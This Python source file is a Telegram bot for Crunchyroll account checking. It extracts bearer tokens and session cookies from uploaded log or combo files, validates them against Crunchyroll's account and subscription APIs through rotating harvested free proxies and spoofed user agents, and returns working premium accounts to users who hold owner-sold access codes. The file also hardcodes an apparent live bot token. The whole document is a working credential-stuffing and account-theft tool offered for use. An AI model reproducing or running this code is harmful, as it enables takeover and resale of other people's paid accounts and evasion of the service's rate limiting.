#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CRUNCHY PREMIUM TG BOT – v8.0 (FULL FIXED + FAST + ACCESS)
- Real working premium Crunchyroll accounts only
- Proxy harvesting + live testing
- Owner generates codes → 24h access
- Fast multi-thread checker (50k+ lines)
- Live progress interface
- All bugs fixed, no stuck, no crash
"""

import os
import sys
import re
import json
import time
import random
import csv
import logging
import tempfile
import threading
import base64
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip3 install requests")
    sys.exit(1)

try:
    from telegram import Update, Document, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (
        Application, CommandHandler, MessageHandler,
        ContextTypes, filters, CallbackQueryHandler
    )
except ImportError:
    print("[!] pip3 install python-telegram-bot==21.6")
    sys.exit(1)

# ===================== CONFIG =====================
BOT_TOKEN = "8888001889:AAGVqYJyZQ1XBlYnKTTPtG8mV-7y2jKK-6c"
OWNER_ID = 8588291055
OWNER_USERNAME = "@SUNIOxRICH"

# Access system (in-memory)
ACCESS_CODES: Dict[str, dict] = {}   # code -> {"expiry": datetime, "used_by": None}
ACTIVE_USERS: Dict[int, dict] = {}   # user_id -> {"expiry": datetime}

THREADS = 35
ONLY_PREMIUM = True
PROXY_REFRESH_MINUTES = 15
MAX_PROXIES_TO_KEEP = 80
PROXY_TEST_TIMEOUT = 5
PROXY_TEST_URL = "https://httpbin.org/ip"
CHECK_TIMEOUT = 12

# ===================== PROXY SOURCES =====================
PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http_all.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5_all.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
]

# ===================== CRUNCHYROLL =====================
API_ME = "https://beta-api.crunchyroll.com/accounts/v1/me"
API_SUB = "https://beta-api.crunchyroll.com/accounts/v1/me/subscriptions"

USER_AGENTS = [
    "Crunchyroll/3.74.2 Android/13 okhttp/4.12.0",
    "Crunchyroll/3.46.2 Android/13",
    "Crunchyroll/3.49.1_22281 (Android 11; en-US; SHIELD Android TV)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Crunchyroll/3.59.0 Android/12",
]

COOKIE_NAMES = [
    "session", "auth", "crunchyroll_session", "cr_session",
    "etp_rt", "c_locale", "account_auth", "cr_locale"
]

TOKEN_PATTERNS = [
    re.compile(r'(?:access[_-]?token|bearer|token)\s*[=:]\s*["\']?([A-Za-z0-9_\-\.]{20,})["\']?', re.I),
    re.compile(r'Authorization\s*[:=]\s*Bearer\s+([A-Za-z0-9_\-\.]{20,})', re.I),
    re.compile(r'"access_token"\s*:\s*"([A-Za-z0-9_\-\.]{20,})"', re.I),
    re.compile(r'Bearer\s+([A-Za-z0-9_\-\.]{30,})', re.I),
    re.compile(r'(eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{10,})', re.I),
]

COOKIE_PATTERNS = [
    re.compile(r'(?:session|auth|crunchyroll_session|cr_session|etp_rt)\s*[=:]\s*([^;\s"\']{10,})', re.I),
    re.compile(r'Cookie\s*[:=]\s*.*?(?:session|auth)=([^;\s]+)', re.I),
    re.compile(r'"session"\s*:\s*"([^"]{10,})"', re.I),
    re.compile(r'(?:etp_rt|c_locale)\s*=\s*([^;\s]{8,})', re.I),
]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("CrunchyTG")

LIVE_PROXIES: List[Dict] = []
PROXY_LOCK = threading.Lock()
LAST_PROXY_HARVEST = 0.0
PROGRESS_LOCK = threading.Lock()


# ===================== ACCESS HELPERS =====================
def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID


def has_access(user_id: int) -> bool:
    if is_owner(user_id):
        return True
    info = ACTIVE_USERS.get(user_id)
    if info and info["expiry"] > datetime.now():
        return True
    if info:
        ACTIVE_USERS.pop(user_id, None)
    return False


def generate_code() -> str:
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(random.choice(chars) for _ in range(12))


# ===================== SESSION & PROXY =====================
def create_session() -> requests.Session:
    s = requests.Session()
    retries = Retry(
        total=2,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET"]
    )
    adapter = HTTPAdapter(max_retries=retries, pool_connections=40, pool_maxsize=40)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


def harvest_proxies() -> List[str]:
    raw = set()
    session = create_session()
    for url in PROXY_SOURCES:
        try:
            r = session.get(url, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "://" in line:
                        line = line.split("://", 1)[-1]
                    if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", line):
                        raw.add(line)
        except Exception:
            continue
    logger.info(f"Harvested {len(raw)} unique proxies")
    return list(raw)


def test_one_proxy(proxy_str: str) -> Optional[Dict]:
    for scheme in ("http", "socks5"):
        proxies = {
            "http": f"{scheme}://{proxy_str}",
            "https": f"{scheme}://{proxy_str}"
        }
        try:
            r = requests.get(
                PROXY_TEST_URL,
                proxies=proxies,
                timeout=PROXY_TEST_TIMEOUT,
                headers={"User-Agent": random.choice(USER_AGENTS)}
            )
            if r.status_code == 200:
                return proxies
        except Exception:
            continue
    return None


def refresh_live_proxies(force: bool = False):
    global LIVE_PROXIES, LAST_PROXY_HARVEST
    now = time.time()
    if (not force and
            (now - LAST_PROXY_HARVEST) < (PROXY_REFRESH_MINUTES * 60) and
            LIVE_PROXIES):
        return
    logger.info("Refreshing live proxy pool...")
    candidates = harvest_proxies()
    if not candidates:
        logger.warning("No proxies harvested")
        return
    random.shuffle(candidates)
    to_test = candidates[:250]
    live = []
    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(test_one_proxy, p): p for p in to_test}
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res:
                    live.append(res)
                    if len(live) >= MAX_PROXIES_TO_KEEP:
                        break
            except Exception:
                continue
    with PROXY_LOCK:
        LIVE_PROXIES = live
        LAST_PROXY_HARVEST = now
    logger.info(f"Live proxies ready: {len(LIVE_PROXIES)}")


def get_random_proxy() -> Optional[Dict]:
    with PROXY_LOCK:
        if LIVE_PROXIES:
            return random.choice(LIVE_PROXIES)
    return None


# ===================== CREDENTIAL EXTRACTION =====================
def extract_creds(text: str) -> List[Dict]:
    creds = []
    for pat in TOKEN_PATTERNS:
        for m in pat.finditer(text):
            val = m.group(1).strip()
            if len(val) >= 20:
                creds.append({"type": "token", "value": val})
    for pat in COOKIE_PATTERNS:
        for m in pat.finditer(text):
            val = m.group(1).strip()
            if len(val) >= 10:
                creds.append({"type": "cookie", "value": val})
    # also catch plain email:pass style if present (extra safety)
    for line in text.splitlines():
        line = line.strip()
        if ":" in line and len(line) < 200:
            parts = line.split(":", 1)
            if len(parts) == 2 and "@" in parts[0] and len(parts[1]) > 3:
                # skip pure email:pass – Crunchy needs token/cookie
                pass
    seen = set()
    unique = []
    for c in creds:
        key = (c["type"], c["value"][:80])
        if key not in seen:
            seen.add(key)
            unique.append(c)
    return unique


def is_token_expired(token: str) -> bool:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        exp = data.get("exp")
        return bool(exp and int(exp) < time.time())
    except Exception:
        return False


def is_premium_in_dict(d: dict) -> bool:
    if not isinstance(d, dict):
        return False
    for field in ("premium", "is_premium", "has_premium", "isPremium"):
        val = d.get(field)
        if val in (True, "true", "1", "yes", 1):
            return True
    sub = d.get("subscription") or d.get("membership") or d.get("benefit") or {}
    if isinstance(sub, dict):
        if sub.get("active") or sub.get("premium") or sub.get("status") in ("active", "ACTIVE"):
            return True
        plan = str(sub.get("plan") or sub.get("type") or sub.get("tier") or "").lower()
        if plan and plan not in ("free", "none", "", "null", "basic"):
            return True
    # nested benefits
    benefits = d.get("benefits") or d.get("entitlements") or []
    if isinstance(benefits, list):
        for b in benefits:
            if isinstance(b, dict) and str(b.get("type", "")).lower() in ("premium", "fan", "mega"):
                return True
    return False


# ===================== VERIFIER =====================
def verify_credential(cred: Dict) -> Tuple[bool, bool, Optional[dict], str]:
    if cred["type"] == "token" and is_token_expired(cred["value"]):
        return False, False, None, "token_expired"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
    }
    cookies = {}
    if cred["type"] == "token":
        headers["Authorization"] = f"Bearer {cred['value']}"
    else:
        for name in COOKIE_NAMES:
            cookies[name] = cred["value"]

    proxy = get_random_proxy()
    session = create_session()
    last_err = ""

    for attempt in range(1, 4):
        try:
            resp = session.get(
                API_ME,
                headers=headers,
                cookies=cookies,
                timeout=CHECK_TIMEOUT,
                proxies=proxy
            )
            if resp.status_code == 429:
                time.sleep(1.2 * attempt)
                proxy = get_random_proxy()
                last_err = "rate_limited"
                continue
            if resp.status_code in (401, 403):
                return False, False, None, f"http_{resp.status_code}"
            if resp.status_code != 200:
                last_err = f"http_{resp.status_code}"
                proxy = get_random_proxy()
                continue

            data = resp.json()
            if not any(k in data for k in ("account_id", "email", "external_id", "username", "id")):
                return False, False, None, "no_account_data"

            premium = is_premium_in_dict(data)
            if not premium:
                try:
                    sub_resp = session.get(
                        API_SUB,
                        headers=headers,
                        cookies=cookies,
                        timeout=10,
                        proxies=proxy
                    )
                    if sub_resp.status_code == 200:
                        sub_data = sub_resp.json()
                        premium = is_premium_in_dict(sub_data) or is_premium_in_dict(data)
                except Exception:
                    pass

            return True, premium, data, ""

        except requests.exceptions.Timeout:
            last_err = "timeout"
            proxy = get_random_proxy()
        except requests.exceptions.ProxyError:
            last_err = "proxy_error"
            proxy = get_random_proxy()
        except Exception as e:
            last_err = str(e)[:50]
            proxy = get_random_proxy()
        time.sleep(0.4 * attempt)

    return False, False, None, last_err or "unknown"


# ===================== CHECKER ENGINE =====================
def run_checker(text: str, progress_callback=None) -> Dict:
    refresh_live_proxies()
    creds = extract_creds(text)
    total = len(creds)
    if total == 0:
        return {
            "premium": [], "working": [], "failed": 0,
            "expired": 0, "total": 0, "processed": 0
        }

    results = {
        "premium": [], "working": [], "failed": 0,
        "expired": 0, "total": total, "processed": 0
    }
    lock = threading.Lock()

    def worker(cred: Dict) -> Dict:
        ok, premium, data, err = verify_credential(cred)
        return {"cred": cred, "ok": ok, "premium": premium, "data": data, "err": err}

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(worker, c): c for c in creds}
        for fut in as_completed(futures):
            try:
                r = fut.result()
            except Exception:
                with lock:
                    results["failed"] += 1
                    results["processed"] += 1
                continue

            with lock:
                results["processed"] += 1
                if r["err"] == "token_expired":
                    results["expired"] += 1
                elif not r["ok"]:
                    results["failed"] += 1
                else:
                    email = "unknown"
                    if r["data"]:
                        email = (
                            r["data"].get("email")
                            or r["data"].get("username")
                            or r["data"].get("external_id")
                            or r["data"].get("account_id")
                            or r["data"].get("id")
                            or "unknown"
                        )
                    entry = {
                        "credential": r["cred"],
                        "user": str(email),
                        "premium": r["premium"],
                        "raw_data": r["data"]
                    }
                    results["working"].append(entry)
                    if r["premium"]:
                        results["premium"].append(entry)

                if progress_callback and results["processed"] % 25 == 0:
                    try:
                        progress_callback(results)
                    except Exception:
                        pass

    return results


def make_export_file(accounts: List[Dict], fmt: str = "txt") -> str:
    fd, path = tempfile.mkstemp(suffix=f".{fmt}", prefix="crunchy_")
    os.close(fd)
    path = Path(path)
    if fmt == "json":
        with open(path, "w", encoding="utf-8") as f:
            json.dump(accounts, f, indent=2, ensure_ascii=False)
    elif fmt == "csv":
        with open(path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=["user", "type", "value", "premium"])
            writer.writeheader()
            for a in accounts:
                writer.writerow({
                    "user": a.get("user", ""),
                    "type": a["credential"]["type"],
                    "value": a["credential"]["value"],
                    "premium": a.get("premium", False)
                })
    else:
        with open(path, "w", encoding="utf-8") as f:
            for a in accounts:
                f.write(f"{a['user']} | {a['credential']['type']} | {a['credential']['value']}\n")
    return str(path)


# ===================== TELEGRAM HANDLERS =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if is_owner(user_id):
        keyboard = [
            [InlineKeyboardButton("🔑 Generate Code", callback_data="gen_code")],
            [InlineKeyboardButton("📊 Bot Status", callback_data="status")],
            [InlineKeyboardButton("📡 Refresh Proxies", callback_data="refresh")]
        ]
        await update.message.reply_text(
            "👑 **Welcome Owner!**\n\n"
            "You have full access to the bot.\n"
            "Use the buttons below or send a file to check.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        return

    if has_access(user_id):
        expiry = ACTIVE_USERS[user_id]["expiry"].strftime("%d-%m-%Y %H:%M")
        await update.message.reply_text(
            "🎉 **Congratulations!**\n\n"
            "You got access of **Premium Checker**\n"
            f"⏳ Expires: `{expiry}`\n\n"
            "📌 **How to use:**\n"
            "1️⃣ Just send any `.txt` / `.log` / `.json` file\n"
            "2️⃣ Bot auto-extracts & checks credentials\n"
            "3️⃣ You receive only **real working Premium** accounts\n\n"
            "⚡ Speed: 35 threads | 50k+ lines supported\n"
            "📖 /help for commands",
            parse_mode="Markdown"
        )
    else:
        keyboard = [[InlineKeyboardButton("🔑 Get Access", callback_data="get_access")]]
        await update.message.reply_text(
            "⛔ **Access Denied**\n\n"
            "You don't have access to this bot.\n"
            "Get access from the owner.\n\n"
            f"👤 Owner: `{OWNER_USERNAME}`\n\n"
            "Once you have a code use:\n"
            "`/redeem YOUR_CODE`",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not has_access(user_id) and not is_owner(user_id):
        await update.message.reply_text(
            f"⛔ Access denied.\nContact owner: `{OWNER_USERNAME}`",
            parse_mode="Markdown"
        )
        return

    text = (
        "📖 **Bot Commands**\n\n"
        "🔹 `/start` – Welcome / Access check\n"
        "🔹 `/help` – This menu\n"
        "🔹 `/get` – Check your access status\n"
        "🔹 `/redeem CODE` – Activate access code\n\n"
        "👑 **Owner only**\n"
        "🔹 `/gen 24` – Generate 24h code (1-72h)\n"
        "🔹 `/status` – Live bot status\n"
        "🔹 `/refresh` – Force proxy refresh\n\n"
        "📂 **Usage (very simple)**\n"
        "1️⃣ Send any `.txt` / `.log` / `.json` file\n"
        "2️⃣ Wait for live progress\n"
        "3️⃣ Receive only real Premium accounts\n\n"
        f"👤 Owner: `{OWNER_USERNAME}`"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def get_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if has_access(user_id):
        if is_owner(user_id):
            await update.message.reply_text(
                "✅ **Owner Access**\n\nUnlimited access.",
                parse_mode="Markdown"
            )
        else:
            expiry = ACTIVE_USERS[user_id]["expiry"].strftime("%d-%m-%Y %H:%M")
            await update.message.reply_text(
                f"✅ **Access Active**\n\nExpires: `{expiry}`",
                parse_mode="Markdown"
            )
    else:
        await update.message.reply_text(
            f"❌ **No Active Access**\n\nContact Owner: `{OWNER_USERNAME}`",
            parse_mode="Markdown"
        )


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⛔ Owner only.")
        return
    with PROXY_LOCK:
        proxy_count = len(LIVE_PROXIES)
    active_users = sum(
        1 for u, d in ACTIVE_USERS.items()
        if d["expiry"] > datetime.now()
    )
    await update.message.reply_text(
        f"📊 **Bot Status**\n\n"
        f"👑 Owner: `{OWNER_USERNAME}`\n"
        f"🌐 Live Proxies: `{proxy_count}`\n"
        f"👥 Active Users: `{active_users}`\n"
        f"🧵 Threads: `{THREADS}`\n"
        f"🔁 Proxy Refresh: `{PROXY_REFRESH_MINUTES} min`\n"
        f"💎 Mode: `Premium Only`",
        parse_mode="Markdown"
    )


async def refresh_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Owner only.")
        return
    msg = await update.message.reply_text("🔄 Harvesting & testing proxies...")
    try:
        refresh_live_proxies(force=True)
        with PROXY_LOCK:
            count = len(LIVE_PROXIES)
        await msg.edit_text(
            f"✅ **Live proxies ready:** `{count}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        await msg.edit_text(f"❌ Error: `{str(e)[:120]}`", parse_mode="Markdown")


async def gen_code_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Owner only.")
        return
    args = context.args
    if not args or len(args) != 1:
        await update.message.reply_text(
            "❌ Usage: `/gen 24`\nHours (1-72)",
            parse_mode="Markdown"
        )
        return
    try:
        hours = int(args[0])
        if hours < 1 or hours > 72:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Enter valid hours (1-72)")
        return

    code = generate_code()
    expiry = datetime.now() + timedelta(hours=hours)
    ACCESS_CODES[code] = {"expiry": expiry, "used_by": None}
    await update.message.reply_text(
        f"✅ **Code Generated!**\n\n"
        f"🔑 `{code}`\n"
        f"⏳ Valid for: `{hours} hours`\n\n"
        f"Send this code to the user.\n"
        f"User will redeem with:\n"
        f"`/redeem {code}`",
        parse_mode="Markdown"
    )


async def redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if has_access(user_id):
        await update.message.reply_text("✅ You already have active access.")
        return
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: `/redeem YOUR_CODE`",
            parse_mode="Markdown"
        )
        return

    code = context.args[0].strip().upper()
    if code not in ACCESS_CODES:
        await update.message.reply_text("❌ Invalid code.")
        return

    data = ACCESS_CODES[code]
    if data["used_by"] is not None:
        await update.message.reply_text("❌ This code has already been used.")
        return
    if data["expiry"] < datetime.now():
        await update.message.reply_text("❌ This code has expired.")
        return

    data["used_by"] = user_id
    ACTIVE_USERS[user_id] = {"expiry": data["expiry"]}
    await update.message.reply_text(
        "🎉 **Congratulations!**\n\n"
        "You got access of **Premium Checker**\n"
        f"⏳ Expires: `{data['expiry'].strftime('%d-%m-%Y %H:%M')}`\n\n"
        "Just send any file to start checking.",
        parse_mode="Markdown"
    )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if not has_access(user_id) and not is_owner(user_id):
        await update.message.reply_text(
            f"⛔ Access denied.\nContact: `{OWNER_USERNAME}`",
            parse_mode="Markdown"
        )
        return

    doc: Document = update.message.document
    if not doc:
        return

    file_name = doc.file_name or "unknown.txt"
    if not any(file_name.lower().endswith(ext) for ext in (".txt", ".log", ".json")):
        await update.message.reply_text("❌ Only `.txt` / `.log` / `.json` files allowed.")
        return

    msg = await update.message.reply_text(
        f"📥 Downloading `{file_name}` ...",
        parse_mode="Markdown"
    )

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        tmp_path = Path(tempfile.gettempdir()) / f"crunchy_{user_id}_{int(time.time())}.txt"
        await tg_file.download_to_drive(custom_path=str(tmp_path))

        with open(tmp_path, "r", encoding="utf-8", errors="ignore") as f:
            text = f.read()
        tmp_path.unlink(missing_ok=True)

        if not text.strip():
            await msg.edit_text("❌ File is empty.")
            return

        # estimate lines
        line_count = text.count("\n") + 1
        await msg.edit_text(
            f"🔄 **Checking credentials...**\n\n"
            f"📄 Lines ≈ `{line_count}`\n"
            f"⏳ Please wait...",
            parse_mode="Markdown"
        )

        last_edit = [0.0]

        def progress_cb(res):
            now = time.time()
            if now - last_edit[0] < 3.5:
                return
            last_edit[0] = now
            try:
                total = res["total"]
                processed = res["processed"]
                prem = len(res["premium"])
                work = len(res["working"])
                fail = res["failed"]
                exp = res["expired"]
                pct = int((processed / total) * 100) if total else 0
                text_prog = (
                    f"🔄 **Checking in progress...**\n\n"
                    f"✅ Checked = `{processed}/{total}` ({pct}%)\n"
                    f"💎 Premium Valid = `{prem}`\n"
                    f"🟢 Working = `{work}`\n"
                    f"❌ Not valid = `{fail}`\n"
                    f"⏳ Expired = `{exp}`\n\n"
                    f"👤 Owner: `{OWNER_USERNAME}`"
                )
                # fire and forget edit (we can't await inside sync callback easily)
                import asyncio
                try:
                    loop = asyncio.get_event_loop()
                    if loop.is_running():
                        asyncio.create_task(msg.edit_text(text_prog, parse_mode="Markdown"))
                except Exception:
                    pass
            except Exception:
                pass

        results = run_checker(text, progress_callback=progress_cb)

        total = results["total"]
        processed = results["processed"]
        working = len(results["working"])
        premium = len(results["premium"])
        failed = results["failed"]
        expired = results["expired"]

        summary = (
            f"✅ **Check Complete!**\n\n"
            f"📊 Total Credentials: `{total}`\n"
            f"🔍 Processed: `{processed}`\n"
            f"✅ Working Accounts: `{working}`\n"
            f"💎 Premium Valid: `{premium}`\n"
            f"❌ Not valid: `{failed}`\n"
            f"⏳ Expired Tokens: `{expired}`\n"
            f"🌐 Live Proxies: `{len(LIVE_PROXIES)}`\n\n"
            f"👤 Owner: `{OWNER_USERNAME}`"
        )
        await msg.edit_text(summary, parse_mode="Markdown")

        to_send = results["premium"] if ONLY_PREMIUM else results["working"]
        if not to_send:
            await update.message.reply_text(
                "😕 No real working Premium accounts found.",
                parse_mode="Markdown"
            )
            return

        txt_path = make_export_file(to_send, "txt")
        json_path = make_export_file(to_send, "json")

        with open(txt_path, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename="premium_accounts.txt"),
                caption=f"💎 **Premium Accounts:** `{len(to_send)}`",
                parse_mode="Markdown"
            )
        with open(json_path, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename="premium_accounts.json"),
                caption="📁 JSON export"
            )

        Path(txt_path).unlink(missing_ok=True)
        Path(json_path).unlink(missing_ok=True)

    except Exception as e:
        logger.exception("Document handler error")
        try:
            await msg.edit_text(
                f"❌ Error: `{str(e)[:180]}`",
                parse_mode="Markdown"
            )
        except Exception:
            pass


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "get_access":
        await query.edit_message_text(
            f"🔑 **Get Access**\n\n"
            f"Contact the owner to get a code:\n"
            f"👤 `{OWNER_USERNAME}`\n\n"
            f"Once you have a code, use:\n"
            f"`/redeem YOUR_CODE`",
            parse_mode="Markdown"
        )
    elif data == "gen_code":
        if not is_owner(user_id):
            await query.edit_message_text("⛔ Owner only.")
            return
        await query.edit_message_text(
            "🔑 **Generate Code**\n\n"
            "Usage: `/gen 24`\n"
            "Hours (1-72)",
            parse_mode="Markdown"
        )
    elif data == "status":
        if not is_owner(user_id):
            await query.edit_message_text("⛔ Owner only.")
            return
        with PROXY_LOCK:
            proxy_count = len(LIVE_PROXIES)
        active_users = sum(
            1 for u, d in ACTIVE_USERS.items()
            if d["expiry"] > datetime.now()
        )
        await query.edit_message_text(
            f"📊 **Bot Status**\n\n"
            f"👑 Owner: `{OWNER_USERNAME}`\n"
            f"🌐 Live Proxies: `{proxy_count}`\n"
            f"👥 Active Users: `{active_users}`\n"
            f"🧵 Threads: `{THREADS}`\n"
            f"🔁 Proxy Refresh: `{PROXY_REFRESH_MINUTES} min`\n"
            f"💎 Mode: `Premium Only`",
            parse_mode="Markdown"
        )
    elif data == "refresh":
        if not is_owner(user_id):
            await query.edit_message_text("⛔ Owner only.")
            return
        await query.edit_message_text("🔄 Harvesting & testing proxies...")
        try:
            refresh_live_proxies(force=True)
            with PROXY_LOCK:
                count = len(LIVE_PROXIES)
            await query.edit_message_text(
                f"✅ **Live proxies ready:** `{count}`",
                parse_mode="Markdown"
            )
        except Exception as e:
            await query.edit_message_text(f"❌ Error: `{str(e)[:100]}`")


async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user and (
        has_access(update.effective_user.id) or is_owner(update.effective_user.id)
    ):
        await update.message.reply_text(
            "📂 Send a `.txt` / `.log` / `.json` file to start checking.\n"
            "Or use /help",
            parse_mode="Markdown"
        )


def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[!] BOT_TOKEN set karo pehle")
        sys.exit(1)

    print("[*] Starting Crunchy Premium TG Bot v8.0 (FIXED)")
    print(f"[*] Owner: {OWNER_USERNAME} ({OWNER_ID})")

    # background proxy harvest
    threading.Thread(target=refresh_live_proxies, args=(True,), daemon=True).start()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("get", get_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("refresh", refresh_cmd))
    app.add_handler(CommandHandler("gen", gen_code_cmd))
    app.add_handler(CommandHandler("redeem", redeem_code))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("[+] Bot running. Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
